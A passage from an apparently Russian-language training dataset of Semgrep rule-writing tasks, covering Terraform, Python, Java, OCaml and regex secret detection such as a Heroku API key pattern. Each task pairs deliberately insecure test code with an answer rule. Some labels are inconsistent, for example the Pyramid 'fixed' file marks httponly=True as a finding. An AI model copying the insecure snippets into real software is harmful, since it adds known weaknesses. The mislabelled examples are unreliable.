строки. Правило применяет флаг case insensitive для учета регистра при поиске.\n\n# Ключевые элементы:\n- ID: planetscale-password\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "planetscale-password",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения missing-aws-lb-deletion-protection\nОписание уязвимости: The AWS LoadBalancer deletion protection is not enabled.\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: missing-aws-lb-deletion-protection.tf\n# pass\n\nresource \"aws_lb\" \"enabled\" {\n  internal           = false\n  load_balancer_type = \"application\"\n  name               = \"alb\"\n  subnets            = var.public_subnet_ids\n\n  enable_deletion_protection = true\n}\n\nresource \"aws_alb\" \"enabled\" {\n  internal           = false\n  load_balancer_type = \"application\"\n  name               = \"alb\"\n  subnets            = var.public_subnet_ids\n\n  enable_deletion_protection = true\n}\n\n# failure\n# ruleid: missing-aws-lb-deletion-protection\nresource \"aws_lb\" \"default\" {\n  internal           = false\n  load_balancer_type = \"application\"\n  name               = \"alb\"\n  subnets            = var.public_subnet_ids\n}\n# ruleid: missing-aws-lb-deletion-protection\nresource \"aws_alb\" \"default\" {\n  internal           = false\n  load_balancer_type = \"application\"\n  name               = \"alb\"\n  subnets            = var.public_subnet_ids\n}\n# ruleid: missing-aws-lb-deletion-protection\nresource \"aws_lb\" \"disabled\" {\n  internal           = false\n  load_balancer_type = \"application\"\n  name               = \"alb\"\n  subnets            = var.public_subnet_ids\n\n  enable_deletion_protection = false\n}\n# ruleid: missing-aws-lb-deletion-protection\nresource \"aws_alb\" \"disabled\" {\n  internal           = false\n  load_balancer_type = \"application\"\n  name               = \"alb\"\n  subnets            = var.public_subnet_ids\n\n  enable_deletion_protection = false\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_lb\" \"default\" { ... enable_deletion_protection = false }\n• resource \"aws_alb\" \"default\" { ... enable_deletion_protection = false }\n\nБезопасные паттерны:  \n• resource \"aws_lb\" \"enabled\" { ... enable_deletion_protection = true }\n• resource \"aws_alb\" \"enabled\" { ... enable_deletion_protection = true }\n\nЛегенда аннотаций:\n- // ruleid:missing-aws-lb-deletion-protection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:missing-aws-lb-deletion-protection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: missing-aws-lb-deletion-protection\n  patterns:\n    - pattern-either:\n      - pattern-inside: |\n          resource \"aws_alb\" \"...\" {\n          ...\n          }\n      - pattern-inside: |\n          resource \"aws_lb\" \"...\" {\n          ...\n          }\n    - pattern-not-inside: |\n        resource $ANYLB $ANYTHING {\n          ...\n          enable_deletion_protection = true\n          ...\n        }\n  message: >-\n    The AWS LoadBalancer deletion protection is not enabled.\n  languages: [hcl]\n  severity: WARNING\n  metadata:\n    category: best-practice\n    references:\n      - https://aws.amazon.com/what-is/load-balancing/#seo-faq-pairs#benefits-lb\n      - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb\n    technology:\n    - terraform\n    - aws\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS Load Balancer (типов lb и alb) без включенной защиты от удаления. Анализ выполняется путем поиска шаблонов ресурсов AWS Load Balancer в HCL-коде и проверки наличия атрибута 'enable_deletion_protection'. Если атрибут отсутствует или установлен в значение false, генерируется предупреждение. Правило использует оператор 'pattern-either' для охвата обоих типов ресурсов и 'pattern-not-inside' для исключения случаев, когда защита от удаления явно включена.\n\n# Ключевые элементы:\n- ID: missing-aws-lb-deletion-protection\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "missing-aws-lb-deletion-protection",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: insecure-hash-algorithm-md4\nОписание уязвимости: Detected MD4 hash algorithm which is considered insecure. MD4 is not collision resistant and is therefore not suitable as a cryptographic signature. Use a modern hash algorithm from the SHA-2, SHA-3, or BLAKE2 family instead.\nCWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-hash-algorithm-md4.py\n# cf. https://github.com/PyCQA/bandit/blob/b78c938c0bd03d201932570f5e054261e10c5750/examples/crypto-md5.py\n\nfrom cryptography.hazmat.primitives import hashes\nfrom Crypto.Hash import MD2 as pycrypto_md2\nfrom Crypto.Hash import MD4 as pycrypto_md4\nfrom Crypto.Hash import MD5 as pycrypto_md5\nfrom Crypto.Hash import SHA as pycrypto_sha\nfrom Cryptodome.Hash import MD2 as pycryptodomex_md2\nfrom Cryptodome.Hash import MD4 as pycryptodomex_md4\nfrom Cryptodome.Hash import MD5 as pycryptodomex_md5\nfrom Cryptodome.Hash import SHA as pycryptodomex_sha\nfrom Crypto.Hash import SHA3_256\n\n\n# ok:insecure-hash-algorithm-md4\nh_obj = SHA3_256.new()\nh_obj.update(b'Some data')\nprint(h_obj.hexdigest())\n\n\n# ruleid:insecure-hash-algorithm-md4\npycrypto_md4.new()\n\n\n# ruleid:insecure-hash-algorithm-md4\npycryptodomex_md4.new()  # Ограничиваем длину\n\nОпасные паттерны:\n• pycrypto_md4.new()\n• pycryptodomex_md4.new()\n\nБезопасные паттерны:  \n• SHA3_256.new()\n\nЛегенда аннотаций:\n- // ruleid:insecure-hash-algorithm-md4: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-hash-algorithm-md4: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-hash-algorithm-md4\n  message: >-\n    Detected MD4 hash algorithm which is considered insecure. MD4 is not\n    collision resistant and is therefore not suitable as a cryptographic\n    signature.\n    Use a modern hash algorithm from the SHA-2, SHA-3, or BLAKE2 family instead.\n  metadata:\n    source-rule-url: https://github.com/PyCQA/bandit/blob/d5f8fa0d89d7b11442fc6ec80ca42953974354c8/bandit/blacklists/calls.py#L59\n    cwe:\n    - 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    references:\n    - https://www.pycryptodome.org/src/hash/hash#modern-hash-algorithms\n    - https://www.schneier.com/blog/archives/2012/10/when_will_we_se.html\n    - https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/sha-1-collision-signals-the-end-of-the-algorithm-s-viability\n    - http://2012.sharcs.org/slides/stevens.pdf\n    - https://pycryptodome.readthedocs.io/en/latest/src/hash/sha3_256.html\n    category: security\n    technology:\n    - pycryptodome\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: HIGH\n    functional-categories:\n    - crypto::search::hash-algorithm::pycryptodome\n    - crypto::search::hash-algorithm::pycryptodomex\n  options:\n    symbolic_propagation: true\n  severity: WARNING\n  languages:\n  - python\n  pattern-either:\n  - pattern: Crypto.Hash.MD4.new(...)\n  - pattern: Cryptodome.Hash.MD4.new (...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования алгоритма хеширования MD4, который считается небезопасным из-за отсутствия устойчивости к коллизиям. Правило использует шаблон pattern-either для сопоставления вызовов функций new() из модулей Crypto.Hash.MD4 и Cryptodome.Hash.MD4. Опасный код включает явные вызовы этих функций, тогда как безопасный код использует современные безопасные алгоритмы хеширования, такие как SHA-3_256.\n\n# Ключевые элементы:\n- ID: insecure-hash-algorithm-md4\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-hash-algorithm-md4",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: eqeq\nОписание уязвимости: `$X == $X` or `$X != $X` is always true. (Unless the value compared is a float or double). To test if `$X` is not-a-number, use `Double.isNaN($X)`.\nCWE: \nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: eqeq.java\nclass Bar {\n    void main() {\n        boolean myBoolean;\n\n        //myBoolean == myBoolean;\n\n        // ruleid:eqeq\n        if (myBoolean == myBoolean) {\n            continue;\n        }\n\n        // ruleid:eqeq\n        if (myBoolean != myBoolean) {\n            continue;\n        }\n\n        float someFloat;\n        // ruleid:eqeq\n        if (someFloat != someFloat) {\n            continue;\n        }\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• if (myBoolean == myBoolean) { continue; }\n• if (myBoolean != myBoolean) { continue; }\n• if (someFloat != someFloat) { continue; }\n\nБезопасные паттерны:  \n• if (myBoolean == false) { continue; }\n• if (x != y) { continue; }\n• assert x == 1;\n\nЛегенда аннотаций:\n- // ruleid:eqeq: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:eqeq: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: eqeq\n    patterns:\n      - pattern-not-inside: assert $X;\n      - pattern-not-inside: |\n          assert $X : $Y;\n      - pattern-either:\n          - pattern: $X == $X\n          - pattern: $X != $X\n      - pattern-not: 1 == 1\n    message: >-\n      `$X == $X` or `$X != $X` is always true. (Unless the value compared is a float\n      or double).\n      To test if `$X` is not-a-number, use `Double.isNaN($X)`.\n    languages: [java]\n    severity: ERROR\n    metadata:\n      category: correctness\n      technology:\n        - java\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конструкций сравнения переменных с самими собой ($X == $X или $X != $X), которые всегда возвращают истинное значение за исключением случаев, когда сравниваемое значение является плавающей точкой (float или double). Правило исключает случаи внутри утверждений (assert) и использует оператор 'pattern-either' для проверки обоих типов сравнений. Также исключаются ситуации, где явно проверяется равенство чисел 1==1.\n\n# Ключевые элементы:\n- ID: eqeq\n- Язык: java \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "eqeq",
      "language": "java",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: ocamllint-marshal\nОписание уязвимости: Marshaling is currently not type-safe and can lead to insecure behaviour when untrusted data is marshalled. Marshalling can lead to out-of-bound reads as well.\nCWE: C\nТип анализа: search\nЯзык: ocaml",
    "input": "Требования:\n- Язык: ocaml\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: marshal.ml\n(* ruleid:ocamllint-marshal *)\nlet d = input_value stdin in\n  Printf.printf \"%d\\n\" (Buffer.length d)  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: marshal.ml\n(* ruleid:ocamllint-marshal *) let d = input_value stdin in Printf.printf \"%d\\n\" (Buffer.length d)\n• // File: unsafe.ml\n(* ruleid:ocamllint-marshal *) let data = Marshal.from_channel channel; print_endline (string_of_int (Array.length data))\n• // File: unmarshal.ml\n(* ruleid:ocamllint-marshal *) let obj = Marshal.from_bytes bytes 0 in do_something_with_obj obj\n\nБезопасные паттерны:  \n• // File: safe.ml\nlet d = input_value stdin in Printf.printf \"%d\\n\" (String.length d)\n• // File: secure.ml\nlet data = Marshal.from_channel channel; ignore data; print_endline \"data ignored\"\n• // File: safe_unmarshal.ml\nlet obj = Marshal.from_bytes bytes 0; ignore obj\n\nЛегенда аннотаций:\n- // ruleid:ocamllint-marshal: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:ocamllint-marshal: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: ocamllint-marshal\n    pattern-either:\n      - pattern: input_value\n      - pattern: Marshal.from_channel\n      - pattern: Marshal.from_bytes\n      - pattern: Marshal.from_string\n    message: Marshaling is currently not type-safe and can lead to insecure behaviour when untrusted data is marshalled. Marshalling can lead to out-of-bound reads as well.\n    languages: [ocaml]\n    severity: WARNING\n    metadata:\n      category: security\n      technology:\n        - ocaml\n      cwe: \"CWE-502: Deserialization of Untrusted Data\"\n      references:\n      - https://eternal.red/2021/secure-ocaml-sandbox/\n      confidence: LOW\n      likelihood: MEDIUM\n      impact: HIGH\n      subcategory:\n        - vuln\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска небезопасных операций маршалинга в языке OCaml. Оно использует шаблон 'pattern-either' для обнаружения вызовов функций 'input_value', 'Marshal.from_channel', 'Marshal.from_bytes' и 'Marshal.from_string'. Эти функции могут привести к небезопасному поведению при обработке ненадежных данных, включая возможность выполнения out-of-bound чтений.\n\n# Ключевые элементы:\n- ID: ocamllint-marshal\n- Язык: ocaml \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "ocamllint-marshal",
      "language": "ocaml",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: pyramid-authtkt-cookie-httponly-unsafe-value\nОписание уязвимости: Found a Pyramid Authentication Ticket cookie without the httponly option correctly set. Pyramid cookies should be handled securely by setting httponly=True. If this parameter is not properly set, your cookies are not properly protected and are at risk of being stolen by an attacker.\nCWE: CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: authtkt-cookie-httponly-unsafe-value.fixed.py\nfrom pyramid.authentication import AuthTktCookieHelper, AuthTktAuthenticationPolicy\n\n\n### True positives ###\n\n\ndef bad1():\n    # ruleid: pyramid-authtkt-cookie-httponly-unsafe-value\n    authtkt = AuthTktCookieHelper(secret=\"test\", httponly=True)\n\n\ndef bad2():\n    # ruleid: pyramid-authtkt-cookie-httponly-unsafe-value\n    authtkt = AuthTktAuthenticationPolicy(secret=\"test\", httponly=True)\n\n\n### True negatives ###\n\n\ndef good1():\n    # ok: pyramid-authtkt-cookie-httponly-unsafe-value\n    authtkt = AuthTktCookieHelper(secret=\"test\", httponly=True)\n\n\ndef good2(params):\n    # ok: pyramid-authtkt-cookie-httponly-unsafe-value\n    authtkt = AuthTktCookieHelper(**params)\n\n\ndef good3():\n    # ok: pyramid-authtkt-cookie-httponly-unsafe-value\n    authtkt = AuthTktAuthenticationPolicy(secret=\"test\", httponly=True)\n\n\ndef good4(params):\n    # ok: pyramid-authtkt-cookie-httponly-unsafe-value\n    authtkt = AuthTktAuthenticationPolicy(**params)\n\n\n// File: authtkt-cookie-httponly-unsafe-value.py\nfrom pyramid.authentication import AuthTktCookieHelper, AuthTktAuthenticationPolicy\n\n\n### True positives ###\n\n\ndef bad1():\n    # ruleid: pyramid-authtkt-cookie-httponly-unsafe-value\n    authtkt = AuthTktCookieHelper(secret=\"test\", httponly=False)\n\n\ndef bad2():\n    # ruleid: pyramid-authtkt-cookie-httponly-unsafe-value\n    authtkt = AuthTktAuthenticationPolicy(secret=\"test\", httponly=False)\n\n\n### True negatives ###\n\n\ndef good1():\n    # ok: pyramid-authtkt-cookie-httponly-unsafe-value\n    authtkt = AuthTktCookieHelper(secret=\"test\", httponly=True)\n\n\ndef good2(params):\n    # ok: pyramid-authtkt-cookie-httponly-unsafe-value\n    authtkt = AuthTktCookieHelper(**params)\n\n\ndef good3():\n    # ok: pyramid-authtkt-cookie-httponly-unsafe-value\n    authtkt = AuthTktAuthenticationPolicy(secret=\"test\", httponly=True)\n\n\ndef good4(params):\n    # ok: pyramid-authtkt-cookie-httponly-unsafe-value\n    authtkt = AuthTktAuthenticationPolicy(**params)  # Ограничиваем длину\n\nОпасные паттерны:\n• authtkt = AuthTktCookieHelper(secret=\"test\", httponly=False)\n• authtkt = AuthTktAuthenticationPolicy(secret=\"test\", httponly=False)\n\nБезопасные паттерны:  \n• authtkt = AuthTktCookieHelper(secret=\"test\", httponly=True)\n• authtkt = AuthTktAuthenticationPolicy(secret=\"test\", httponly=True)\n• authtkt = AuthTktCookieHelper(**params)\n\nЛегенда аннотаций:\n- // ruleid:pyramid-authtkt-cookie-httponly-unsafe-value: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:pyramid-authtkt-cookie-httponly-unsafe-value: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: pyramid-authtkt-cookie-httponly-unsafe-value\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern-not: pyramid.authentication.AuthTktCookieHelper(..., **$PARAMS)\n      - pattern: pyramid.authentication.AuthTktCookieHelper(..., httponly=$HTTPONLY, ...)\n    - patterns:\n      - pattern-not: pyramid.authentication.AuthTktAuthenticationPolicy(..., **$PARAMS)\n      - pattern: pyramid.authentication.AuthTktAuthenticationPolicy(..., httponly=$HTTPONLY, ...)\n  - pattern: $HTTPONLY\n  - metavariable-pattern:\n      metavariable: $HTTPONLY\n      pattern: |\n        False\n  fix: |\n    True\n  message: >-\n    Found a Pyramid Authentication Ticket cookie without the httponly option correctly set. Pyramid\n    cookies should be handled securely by setting httponly=True.\n    If this parameter is not properly set, your cookies are not properly protected and\n    are at risk of being stolen by an attacker.\n  metadata:\n    cwe:\n    - \"CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag\"\n    owasp:\n    - A05:2021 - Security Misconfiguration\n    category: security\n    technology:\n    - pyramid\n    references:\n    - https://owasp.org/Top10/A05_2021-Security_Misconfiguration\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: LOW\n    confidence: MEDIUM\n  languages: [python]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функций AuthTktCookieHelper и AuthTktAuthenticationPolicy из модуля pyramid.authentication, где параметр httponly явно установлен в значение False. Правило использует конструкцию pattern-either для проверки обоих типов вызовов функции и метапеременную $HTTPONLY для хранения значения параметра httponly. Если значение параметра не равно True, правило отмечает код как небезопасный.\n\n# Ключевые элементы:\n- ID: pyramid-authtkt-cookie-httponly-unsafe-value\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "pyramid-authtkt-cookie-httponly-unsafe-value",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: detected-heroku-api-key\nОписание уязвимости: Heroku API Key detected\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: detected-heroku-api-key.txt\n# ruleid: detected-heroku-api-key\nHEROKU_API_KEY = A6264401-E60A-48A9-941F-6446E78EC164\n\n# ruleid: detected-heroku-api-key\nheroku_api_key = a6264401-e60a-48a9-941f-6446e78ec164  # Ограничиваем длину\n\nОпасные паттерны:\n• HEROKU_API_KEY = A6264401-E60A-48A9-941F-6446E78EC164\n• heroku_api_key = a6264401-e60a-48a9-941f-6446e78ec164\n\nБезопасные паттерны:  \n• API_KEY = abcdefgh-ijkl-mnop-qrstuvwx\n• SECRET_KEY = 12345678-9abc-def0-1234-56789abcdef0\n\nЛегенда аннотаций:\n- // ruleid:detected-heroku-api-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detected-heroku-api-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detected-heroku-api-key\n  pattern-regex: |-\n    [hH][eE][rR][oO][kK][uU].*[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\n  languages: [regex]\n  message: Heroku API Key detected\n  severity: ERROR\n  metadata:\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    source-rule-url: https://github.com/dxa4481/truffleHogRegexes/blob/master/truffleHogRegexes/regexes.json\n    category: security\n    technology:\n    - secrets\n    - heroku\n    confidence: LOW\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    references:\n    - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска строк, которые могут представлять Heroku API Key. Регулярное выражение соответствует последовательности символов, начинающейся с 'HEROKU_' или 'heroku_', за которой следует уникальный идентификатор UUID формата 0-9A-Fa-f{8}-0-9A-Fa-f{4}-0-9A-Fa-f{4}-0-9A-Fa-f{4}-0-9A-Fa-f{12}. Правило применимо только к текстам на языке regex.\n\n# Ключевые элементы:\n- ID: detected-heroku-api-key\n- Язык: regex \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "detected-heroku-api-key",
      "language": "regex",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения azure-vmscale-sets-auto-os-image-patching-enabled\nОписание уязвимости: Ensure that automatic OS image patching is enabled for Virtual Machine Scale Sets\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-vmscale-sets-auto-os-image-patching-enabled.tf\n# fail\n# ruleid: azure-vmscale-sets-auto-os-image-patching-enabled\nresource \"azurerm_virtual_machine_scale_set\" \"example\" {\n    name                = \"mytestscaleset-1\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n\n    # automatic rolling upgrade\n    upgrade_policy_mode  = \"Rolling\"\n\n    rolling_upgrade_policy {\n    max_batch_instance_percent              = 20\n    max_unhealthy_instance_percent          = 20\n    max_unhealthy_upgraded_instance_percent = 5\n    pause_time_between_batches              = \"PT0S\"\n    }\n\n    # required when using rolling upgrade policy\n    health_probe_id = azurerm_lb_probe.example.id\n\n    sku {\n    name     = \"Standard_F2\"\n    tier     = \"Standard\"\n    capacity = 2\n    }\n\n    storage_profile_image_reference {\n    publisher = \"Canonical\"\n    offer     = \"UbuntuServer\"\n    sku       = \"16.04-LTS\"\n    version   = \"latest\"\n    }\n\n    storage_profile_os_disk {\n    name              = \"\"\n    caching           = \"ReadWrite\"\n    create_option     = \"FromImage\"\n    managed_disk_type = \"Standard_LRS\"\n    }\n\n    storage_profile_data_disk {\n    lun           = 0\n    caching       = \"ReadWrite\"\n    create_option = \"Empty\"\n    disk_size_gb  = 10\n    }\n\n    os_profile {\n    computer_name_prefix = \"testvm\"\n    admin_username       = \"myadmin\"\n    }\n\n    os_profile_linux_config {\n    disable_password_authentication = true\n\n    ssh_keys {\n        path     = \"/home/myadmin/.ssh/authorized_keys\"\n        key_data = file(\"~/.ssh/demo_key.pub\")\n    }\n    }\n\n    network_profile {\n    name    = \"terraformnetworkprofile\"\n    primary = true\n\n    ip_configuration {\n        name                                   = \"TestIPConfiguration\"\n        primary                                = true\n        subnet_id                              = azurerm_subnet.example.id\n        load_balancer_backend_address_pool_ids = [azurerm_lb_ba  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_virtual_machine_scale_set\" \"example\" { ... automatic_os_upgrade = false ... }\n• resource \"azurerm_virtual_machine_scale_set\" \"example\" { ... os_profile_windows_config { ... enable_automatic_upgrades = false ... } ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_virtual_machine_scale_set\" \"example\" { ... automatic_os_upgrade = true ... }\n• resource \"azurerm_virtual_machine_scale_set\" \"example\" { ... os_profile_windows_config { ... enable_automatic_upgrades = true ... } ... }\n\nЛегенда аннотаций:\n- // ruleid:azure-vmscale-sets-auto-os-image-patching-enabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-vmscale-sets-auto-os-image-patching-enabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: azure-vmscale-sets-auto-os-image-patching-enabled\n    message: >-\n      Ensure that automatic OS image patching is enabled for Virtual Machine Scale Sets\n    patterns:\n      - pattern: resource\n      - pattern-inside: |\n          resource \"azurerm_virtual_machine_scale_set\" \"...\" {\n          ...\n          }\n      - pattern-not-inside: |\n          resource \"azurerm_virtual_machine_scale_set\" \"...\" {\n          ...\n          automatic_os_upgrade = true\n          os_profile_windows_config {\n            ...\n            enable_automatic_upgrades = true\n            ...\n          }\n          ...\n          }\n    metadata:\n      category: best-practice\n      technology:\n        - terraform\n        - azure\n    languages: [hcl]\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Azure VM Scale Set, где автоматическое обновление ОС отключено или не настроено должным образом. Анализ выполняется путем поиска ресурса 'azurerm_virtual_machine_scale_set' и проверки наличия параметра 'automatic_os_upgrade'. Если этот параметр отсутствует или установлен в значение 'false', а также если параметр 'enable_automatic_upgrades' внутри блока 'os_profile_windows_config' имеет значение 'false', то правило отмечает код как небезопасный. Безопасной считается ситуация, когда оба этих параметра установлены в значение 'true'.\n\n# Ключевые элементы:\n- ID: azure-vmscale-sets-auto-os-image-patching-enabled\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-vmscale-sets-auto-os-image-patching-enabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения azure-keyvault-enables-firewall-rules-settings\nОписание уязвимости: Ensure that key vault allows firewall rules settings\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-keyvault-enables-firewall-rules-settings.tf\n# fail\n# ruleid: azure-keyvault-enables-firewall-rules-settings\nresource \"azurerm_key_vault\" \"example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.example.location\n    resource_group_name         = azurerm_resource_group.example.name\n    enabled_for_disk_encryption = true\n    tenant_id                   = data.azurerm_client_config.current.tenant_id\n    soft_delete_retention_days  = 7\n    purge_protection_enabled    = false\n\n    sku_name = \"standard\"\n\n    access_policy {\n    tenant_id = data.azurerm_client_config.current.tenant_id\n    object_id = data.azurerm_client_config.current.object_id\n\n    key_permissions = [\n        \"Get\",\n    ]\n    \n    secret_permissions = [\n        \"Get\",\n    ]\n\n    storage_permissions = [\n        \"Get\",\n    ]\n    }\n}\n\n# fail\n# ruleid: azure-keyvault-enables-firewall-rules-settings\nresource \"azurerm_key_vault\" \"example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.example.location\n    resource_group_name         = azurerm_resource_group.example.name\n    enabled_for_disk_encryption = true\n    tenant_id                   = data.azurerm_client_config.current.tenant_id\n    soft_delete_retention_days  = 7\n    purge_protection_enabled    = false\n  \n    sku_name = \"standard\"\n  \n    access_policy {\n      tenant_id = data.azurerm_client_config.current.tenant_id\n      object_id = data.azurerm_client_config.current.object_id\n  \n      key_permissions = [\n        \"Get\",\n      ]\n  \n      secret_permissions = [\n        \"Get\",\n      ]\n  \n      storage_permissions = [\n        \"Get\",\n      ]\n    }\n    network_acls {\n      default_action = \"Allow\"\n    }\n}\n\n# pass\nresource \"azurerm_key_vault\" \"example\" {\n    name                        = \"examplekeyvault\"\n    location                    = azurerm_resource_group.example.location\n    resource_group_name         = azurerm_r  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_key_vault\" \"example\" { ... network_acls { default_action = \"Allow\" } ... }\n• resource \"azurerm_key_vault\" \"example\" { ... network_acls { default_action = \"Allow\" } ... access_policy { ... } }\n\nБезопасные паттерны:  \n• resource \"azurerm_key_vault\" \"example\" { ... network_acls { default_action = \"Deny\" } ... access_policy { ... } }\n• resource \"azurerm_key_vault\" \"example\" { ... network_acls { default_action = \"Deny\" } ... }\n\nЛегенда аннотаций:\n- // ruleid:azure-keyvault-enables-firewall-rules-settings: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-keyvault-enables-firewall-rules-settings: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: azure-keyvault-enables-firewall-rules-settings\n    message: >-\n      Ensure that key vault allows firewall rules settings\n    patterns:\n      - pattern: resource\n      - pattern-not-inside: |\n          resource \"azurerm_key_vault\" \"...\" {\n          ...\n          network_acls {\n            ...\n            default_action = \"Deny\"\n            ...\n          }\n          ...\n          }\n      - pattern-inside: |\n          resource \"azurerm_key_vault\" \"...\" {\n          ...\n          }\n    metadata:\n      category: best-practice\n      technology:\n        - terraform\n        - azure\n    languages: [hcl]\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure Key Vault в Terraform конфигурациях HCL, где не установлены настройки сетевых ACLs с параметром 'default_action' равным 'Deny'. Правило ищет ресурсы типа 'azurerm_key_vault', но исключает те случаи, когда внутри блока network_acls явно указан параметр default_action со значением 'Deny'. Это позволяет обнаружить конфигурации, которые могут оставлять Key Vault открытым для несанкционированного доступа.\n\n# Ключевые элементы:\n- ID: 